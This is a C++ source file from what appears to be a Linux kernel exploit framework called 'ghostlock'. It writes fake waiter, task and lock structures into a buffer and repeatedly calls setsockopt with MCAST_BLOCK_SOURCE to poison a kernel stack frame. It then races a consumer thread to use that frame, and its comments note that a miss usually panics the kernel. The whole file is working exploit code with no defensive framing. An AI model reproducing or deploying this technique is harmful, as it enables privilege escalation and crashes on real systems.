/**
 * @file route_multicast.cpp
 * @brief multicast 物理机制（`MCAST_BLOCK_SOURCE` 单发）与策略钩子。
 */
#include "route_multicast.h"
#include "route.h"
#include "race.h"
#include "session.h"
#include "memory.h"
#include "support.h"
#include "log.h"
#include "profile.h"

/* ==== route/multicast_route.cpp ==== */
#include <netinet/in.h>
#include <ctime>
#include <unistd.h>

#include <cstring>

#if defined(__clang__)
#pragma clang diagnostic ignored "-Wvla-cxx-extension"
#endif


using namespace ghostlock;

namespace ghostlock::route::multicast {
    MulticastRoute::MulticastRoute(const core::MulticastInputs &inputs) noexcept
        : in(inputs) {
        status.code = ROUTE_RETRYABLE;
    }

    int32_t MulticastRoute::fail(int32_t step, int32_t error_number) noexcept {
        status.step = step;
        status.error_number = error_number;
        return -1;
    }

    int32_t MulticastRoute::prepare() noexcept {
        const profile::MulticastWaiterLayout &layout = in.layout;
        /* Absent geometry (e.g. an underivable waiter_off) is a hard refusal:
         * one-shot multicast must never guess a landing. */
        if (!layout.buffer_size || !layout.waiter_offset || !layout.task_offset ||
            !layout.lock_offset) {
            pr_warning("multicast geometry incomplete (waiter_off not provided)\n");
            return fail(58, EINVAL);
        }
        const size_t stamp_size = *layout.buffer_size;
        /* Execution parameters are inputs, never defaults: a missing count would
         * silently turn the one-shot into a different (panicking) shape. */
        if (in.attempts <= 0 || in.arm_sequence <= 0 || in.arm_hold <= 0) {
            pr_warning("multicast execution parameters incomplete (attempts=%d "
                       "arm_seq=%d arm_hold=%d)\n", in.attempts, in.arm_sequence,
                       in.arm_hold);
            return fail(62, EINVAL);
        }
        /* The family field must live inside the buffer the copy uses. */
        if (in.sockaddr_family_offset + sizeof(uint16_t) > stamp_size) {
            pr_warning("multicast family offset %zu exceeds buffer %zu\n",
                       in.sockaddr_family_offset, stamp_size);
            return fail(63, EOVERFLOW);
        }
        socket_fd.reset(socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0));
        if (!socket_fd.valid()) {
            return fail(60, errno);
        }
        return 0;
    }

    route::RouteStatus MulticastRoute::execute() noexcept {
        const profile::MulticastWaiterLayout &layout = in.layout;
        const size_t stamp_size = *layout.buffer_size;
        /* VLA size comes from the validated profile geometry; the encode step
         * rejects an undersized buffer before any indexed write. */
    __extension__ unsigned char stamp[stamp_size]; // NOLINT(clang-analyzer-core.VLASize)
        memset(stamp, 0, sizeof(stamp));
        if (!memory::encode_multicast_waiter(
            {reinterpret_cast<std::byte *>(stamp), stamp_size},
            static_cast<size_t>(*layout.waiter_offset), *layout.task_offset,
            *layout.lock_offset,
            in.fake_task, in.fake_lock)) {
            pr_warning("multicast byte injection rejected: waiter=%zu task=%zu "
                       "lock=%zu buffer=%zu\n", static_cast<size_t>(*layout.waiter_offset),
                       static_cast<size_t>(*layout.task_offset),
                       static_cast<size_t>(*layout.lock_offset), stamp_size);
            (void) fail(59, EOVERFLOW);
            return status;
        }
        uint16_t family = AF_UNSPEC;
        memcpy(stamp + in.sockaddr_family_offset, &family, sizeof(family));

        in.consumer_calls->store(0);
        in.consumer_success->store(0);
        in.consumer_stop->store(0);
        in.route_delay_usec->store(0);
        /* 2255b60a: single-shot setsockopt is one lottery ticket and a miss
         * usually panics the kernel. Re-poison and re-walk, arming only after
         * the earlier copies overwrote each other; hold the waiter on yield
         * (no syscall) between copy and walk so the poisoned frame survives. */
        const int32_t max_attempts = in.attempts;
        const int32_t arm_sequence = in.arm_sequence;
        const int32_t arm_hold = in.arm_hold;
        stamp_result = -1;
        stamp_errno = 0;
        for (int32_t attempt = 1; attempt <= max_attempts; attempt++) {
            attempts_used = attempt;
            /* No syscall between the copy and the walk: it would clobber the
             * poisoned kernel stack frame. */
            errno = 0;
            stamp_result = setsockopt(socket_fd.get(), IPPROTO_IP, MCAST_BLOCK_SOURCE,
                                      stamp, (socklen_t) sizeof(stamp));
            stamp_errno = errno;
            /* The copy lands before the family check, so -EADDRNOTAVAIL still
             * means the waiter shape is on the stack now. */
            if (attempt < arm_sequence ||
                (stamp_result != 0 && stamp_errno != EADDRNOTAVAIL)) {
                continue;
            }
            in.consumer_go->store(attempt);
            /* Hold the poisoned frame while the consumer walks it; wait for the
             * consumer's first call (legacy single-shot bound) instead of a
             * fixed yield count, which is too short on 5.15. */
            for (int32_t spin = 0;
                 spin < arm_hold && in.consumer_calls->load() == 0; spin++)
                __asm__ volatile("yield" ::: "memory");
            in.consumer_go->store(0);
            while (in.consumer_inflight->load())
                __asm__ volatile("yield" ::: "memory");
            if (in.consumer_success->load() > 0) break;
        }
        status.step = 61;
        status.error_number = stamp_errno;
        if (stamp_result == 0 ||
            in.consumer_success->load() > 0) {
            status.step = 0;
            status.error_number = 0;
            status.code = ROUTE_OK;
        }
        return status;
    }

    void MulticastRoute::disarm() noexcept {
        in.consumer_go->store(0);
        while (in.consumer_inflight->load())
            __asm__ volatile("yield" ::: "memory");
        status.kernel_disarmed = 1;
    }

    void MulticastRoute::destroy() noexcept {
        socket_fd.reset();
        status.userspace_clean = 1;
        if (status.code != ROUTE_OK && status.kernel_disarmed) {
            status.code = ROUTE_FALLBACK_SAFE;
        }
    }
} // namespace ghostlock::route::multicast

namespace ghostlock::route {
    route::RouteStatus do_mcast_fake_lock_route(const core::MulticastInputs &in) {
        multicast::MulticastRoute context(in);
        const route::RouteStatus status = run_route_lifecycle(context);
        pr_info("multicast route status=%d clean=%d/%d step=%d errno=%d "
                "attempts=%d calls=%d success=%d\n",
                status.code, status.userspace_clean, status.kernel_disarmed,
                status.step, status.error_number, context.attempts_used,
                in.consumer_calls->load(), in.consumer_success->load());
        return status;
    }

} // namespace ghostlock::route


